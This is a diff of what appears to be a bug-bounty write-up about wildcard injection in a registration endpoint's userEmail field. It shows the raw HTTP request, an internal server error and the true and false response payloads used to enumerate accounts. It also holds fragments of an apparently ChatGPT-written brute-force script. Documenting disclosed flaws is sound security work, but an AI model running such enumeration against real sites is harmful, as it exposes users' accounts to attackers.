@@ -17,14 +17,14 @@ While testing the registration process, I encountered a POST request to a API en
 Fuzzing the endpoint `/registration` with fuzzing payloads using intruder, I stumbled upon a peculiar response when I injected a % character into the `userEmail` parameter. The server returned a 500 Internal Server Error along with a  message
 
 
-```json
+```
 POST /registration HTTP/2
 Host: domain
 Content-Type: application/json;charset=UTF-8
 
 {"userEmail":"%"}
 
-```bash
+```
 There was an unexpected error (type=Internal Server Error, status=500).</div><div>Unable to find com.correnet.matcha.client.model.application.AccessGroup with id 7052; nested exception is javax.persistence.EntityNotFoundException: Unable to find com.correnet.matcha.client.model.application.AccessGroup with id 7052<
 ```
 By observing this error message my assumption was the post request  sent to the registration endpoint with the `userEmail` parameter set to `%`. This input triggers a SQL query in the backend to select all records from the users table where the email column matches any value containing the % character. The error message returned from the server indicates that there are 7052 entries in the system, giving insight into the number of user accounts present.Something like,
@@ -34,14 +34,20 @@ SELECT * FROM users WHERE email LIKE "%"
 ```
 Further testing this endpoint i figured out the true and false case for the email address existence
 
-#### False Response Case:
+##### False Response Case:
+```
+
 HTTP Request Body: {"userEmail":"adamcorta%"}
 HTTP Response: "Could not find resource: ApplicationUser identified by adamcorta%"
 
-#### True Response Case:
+```
+##### True Response Case:
+```
+
 HTTP Request: {"userEmail":"adamcorte%"}
 HTTP Response: "Anonymous user (not logged in) not authorized for operation: [connect application user to Platform user]"
 
+```
 And based on this error messages, I(ChatGPT) made a wacky Python script to automate the email enumeration:
 
 ```python
@@ -113,3 +119,4 @@ def send_request(payload):
 result = brute_force_attack()
 print("The correct username is:", result)
 ```
+In response to this discovery, the program triaged and fixed the vulnerability by implementing input validation and captcha protection to the registration page.
